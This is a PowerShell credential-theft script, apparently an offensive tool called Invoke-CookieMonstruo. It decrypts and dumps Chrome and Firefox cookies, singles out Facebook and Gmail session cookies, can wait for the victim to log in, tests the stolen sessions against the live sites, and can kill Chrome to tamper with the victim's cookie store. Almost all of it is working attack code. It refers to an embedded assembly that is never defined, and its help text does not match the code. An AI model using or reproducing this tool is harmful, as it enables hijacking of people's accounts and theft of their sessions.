Function Invoke-CookieMonstruo{

  <#
  .SYNOPSIS
  This function returns any passwords and history stored in the chrome sqlite databases.

  .DESCRIPTION
  This function uses the System.Data.SQLite assembly to parse the different sqlite db files used by chrome to save passwords and browsing history. The System.Data.SQLite assembly
  cannot be loaded from memory. This is a limitation for assemblies that contain any unmanaged code and/or compiled without the /clr:safe option.

  .PARAMETER Browser
  Choose the browser you want to target, currently supporting chrome and firefox

  .EXAMPLE
  Invoke-CookieMonstruo -Browser chrome

  .PARAMETER Target
  Define a specific web application cookie that you are going for, currently supporting facebook and gmail

  .EXAMPLE
  Invoke-CookieMonstruo -Target facebook

  .PARAMETER WaitSteal
  If the user is not logged onto the target application, will run a loop and wait until it detects the session cookie belonging to it

  .PARAMETER RemoveCookie
  The target cookie will be deleted from the victim's cookie database
 
  .PARAMETER OutFile
  Switch to dump all results out to a file

  .EXAMPLE
  Get-ChromeDump -OutFile "$env:HOMEPATH\chromepwds.txt"
  #>


  ######################PARAMETERS BINDING##############################

  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $False)]
    [string]$OutFile,

    [Parameter(Mandatory = $False)]
    [string]$Target = "all",

    [Parameter(Mandatory = $False)]
    [string]$Browser = "chrome",

    [switch]$WaitSteal,

    [switch]$RemoveCookie
  )
   
   ######################PARAMETERS BINDING##############################
   
   
   ##############################ADD ASSEMBLY############################

    Add-Type -Assembly System.Security

    if([IntPtr]::Size -eq 8)
    {
        #64 bit version
    }
    else
    {
        #32 bit version
    }
    #Unable to load this assembly from memory. The assembly was most likely not compiled using /clr:safe and contains unmanaged code. Loading assemblies of this type from memory will not work. Therefore we have to load it from disk.
    #DLL for sqlite queries and parsing
    #http://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki
    Write-Verbose "[+]System.Data.SQLite.dll will be written to disk"
    $content = [System.Convert]::FromBase64String($assembly) 
    $assemblyPath = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll" 
        
    if(Test-path $assemblyPath)
    {
        try 
        {
            Add-Type -Path $assemblyPath
        }
        catch 
        {
            Write-Warning "[!]Unable to load SQLite assembly"
            break
        }
    }
    else
    {
        [System.IO.File]::WriteAllBytes($assemblyPath,$content)
        Write-Verbose "[+]Assembly for SQLite written to $assemblyPath"
        try 
        {
            Add-Type -Path $assemblyPath
        }
        catch 
        {
            Write-Warning "[!]Unable to load SQLite assembly"
            break
        }
    }


   ##############################ADD ASSEMBLY############################
   
   
  
   
   ############################BROWSER CHECK####################################  
    switch ($Browser)
    {
        "chrome"
        {
            $cookiesdb = Handle-Chrome
            $cookieTable = "cookies"        
        }
        "firefox"
        {
            $cookiesdb = Handle-Firefox
            $cookieTable = "moz_cookies"

        }
        default
        {
            Throw "Not supported browser, please select chrome or firefox"
        }
    }
    ############################BROWSER CHECK####################################


    ############################SETUP DATABASE####################################
    $connStr = "Data Source=$cookiesdb; Version=3;"
    $connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)
    $OpenConnection = $connection.OpenAndReturn()
    Write-Verbose "Opened DB file $cookiesdb"
    ############################SETUP DATABASE####################################  
    
    
    
    ########################TARGET SELECTION##################################  
    #Check whether we have specific target
    switch ($Target)
      {
        "facebook" 
        {
            $queryCondition = "WHERE host_key = '.facebook.com' AND (name = 'xs' or name = 'c_user' or name = 'datr')"
            $nOfCookies = 3
            $CheckSession = $true    
        }
        "gmail"
        {
            $queryCondition = "WHERE (host_key = '.google.com' AND (name = 'SID' or name = 'HSID' or name = 'SSID')) OR (host_key = 'mail.google.com' AND (name = 'OSID'))"
            $nOfCookies = 4
            $CheckSession = $true
        }
        "all" 
        {
            $queryCondition = ""
            $nOfCookies = -1
        }
        default
        {
            Throw "Not recognized target, please select facebook, gmail or all"
        }
      }
      #######################target selection#####################################
      


      
   

    ###########################GET COOKIE########################################## 
    $query = "SELECT * FROM " + $cookieTable + " " + $queryCondition
    $dataset = New-Object System.Data.DataSet    
    $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)
    
    DO{
        $cookies = Get-Cookies $dataset $dataAdapter
        if ($CheckSession) {$validSession = Test-ValidSession $Target $cookies $nOfCookies}     
        if ($WaitSteal -and !$ValidSession) {Start-Sleep -Seconds 5}
        else {break}        
    }while($true)
    ######################get cookies##############################################


    ###########################REMOVE COOKIES#######################################
    if ($RemoveCookie)
    {
        if(Get-Process | Where-Object {$_.Name -like "*chrome*"})
        {
            Write-Warning "[!]Cannot parse Data files while chrome is running"
            Write-Warning "[!]Stopping all chrome processes"
            Stop-Process -processname *chrome*
            #break
        }

        $decryptedBytes = [System.Text.Encoding]::ASCII.GetBytes("aaa")
        $encryptedBytes = [Security.Cryptography.ProtectedData]::Protect($decryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        $query = $connection.CreateCommand()
        $query.CommandText = "UPDATE cookies SET encrypted_value = @encryptedBytes WHERE host_key = '.facebook.com' AND (name = 'xs' or name = 'c_user' or name = 'datr')"
        [void]$query.Parameters.AddWithValue("@encryptedBytes", $encryptedBytes)
        [void]$query.ExecuteNonQuery()
    }
    ################################################################################


    ###########################handle session check########################################
    if ($Target -ne "all")
    {    
        if ($ValidSession)
        {
         $SessionMessage = "->The cookies are linked to a VALID " + $Target.ToString() + " session"        
        }
        else
        {
            $SessionMessage = "->No valid session detected :("
        }
    }
    #########################################################################################


    #Output results
    
    if(!($OutFile))
    {
        "[*]RETRIEVED COOKIES"
        $cookies | Format-Table Domain, Name, Value -Wrap -AutoSize | Out-String
        
        $SessionMessage | Out-String 
        
         
    }
    else 
    {
        "[*]RETRIEVED COOKIES`n"
        $cookies | Format-Table Domain, Name, Value -Wrap -AutoSize | Out-File $OutFile -Append
    }
    
    Write-Warning "[!] Please remove SQLite assembly from here: $assemblyPath"    
}



Function Test-ValidSession($Target, $cookies, $numberOfExpectedCookies)
{
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

    if ($cookies.length -ne $numberOfExpectedCookies)
    {
        return $false
    }


    foreach ($cookie in $cookies)
    {
            $session.Cookies.Add($cookie)
    }
    
    switch($Target)
    {
        "facebook"
        { 
            return Test-ValidSessionFacebook $session "https://www.facebook.com"
        }
        "gmail"
        {
            return Test-ValidSessionGmail $session "https://mail.google.com/mail"
        }

    }
        
       
    
    
} 


Function Test-ValidSessionFacebook($session, $uri)
{
$response = Invoke-WebRequest -Method Head -Uri $uri -WebSession $session -UseBasicParsing

    foreach ($header in $response.headers)
    {
        if ($header.'Set-Cookie' -match "deleted")
        {
            return $false
            break
        }    
    }

    return $true
} 


Function Test-ValidSessionGmail($session, $uri)
{
    $response = Invoke-WebRequest -Method Head -Uri $uri -WebSession $session -UseBasicParsing
    if ($response.StatusCode -eq 200) {return $true}
    else {return $false}
} 


Function Handle-Chrome()
{
    #Check to see if the script is being run as SYSTEM. Not going to work.
    if(([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem)
    {
        Throw "Unable to decrypt cookies for Chrome running as SYSTEM."
    }
    #grab the path to Chrome user data
    $OS = [environment]::OSVersion.Version
    if($OS.Major -ge 6)
    {
        $chromepath = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
    }
    else
    {
        $chromepath = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }
    if(!(Test-path $chromepath))
    {
        Throw "Chrome user data directory does not exist"
    }
    else
    {
        #DB for cookies
        if(Test-Path -Path "$chromepath\Cookies")
        {
            return "$chromepath\Cookies"
        }
    }

}


Function Handle-Firefox()
{
    #grab the path to Chrome user data
    $OS = [environment]::OSVersion.Version
    if($OS.Major -ge 6)
    {
        $firefoxpath = "$($env:APPDATA)\Mozilla\Firefox\Profiles\"
    }
    else
    {
        $firefoxpath = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Application Data\Mozilla\Firefox\Profiles"
    }

    $firefoxProfilePath = Get-ChildItem $firefoxpath -Filter "*.default" | % { $_.fullname }

    if(!(Test-path $firefoxProfilePath))
    {
        Throw "-Firefox user data directory does not exist"
    }
    else
    {
        #DB for cookies
        if(Test-Path -Path "$firefoxProfilePath\cookies.sqlite")
        {
            return "$firefoxProfilePath\cookies.sqlite"
        }
    }

}




Function Get-Cookies ($dataset, $dataAdapter)
{
    $cookies = @()
    $dataset.Clear()
    $foundTargetCookie = $dataAdapter.fill($dataset)  
    $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
        $cookie = New-Object System.Net.Cookie
        if ($Browser -eq "chrome")
        {
            $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($_.encrypted_value, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
            $cookie.Value = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
            $cookie.Domain = $_.host_key
        }
        else 
        {
            $cookie.Value = $_.value
            $cookie.Domain = $_.host   
        }
  
        $cookie.Name = $_.name
        $cookies += $cookie
    }

    return $cookies
}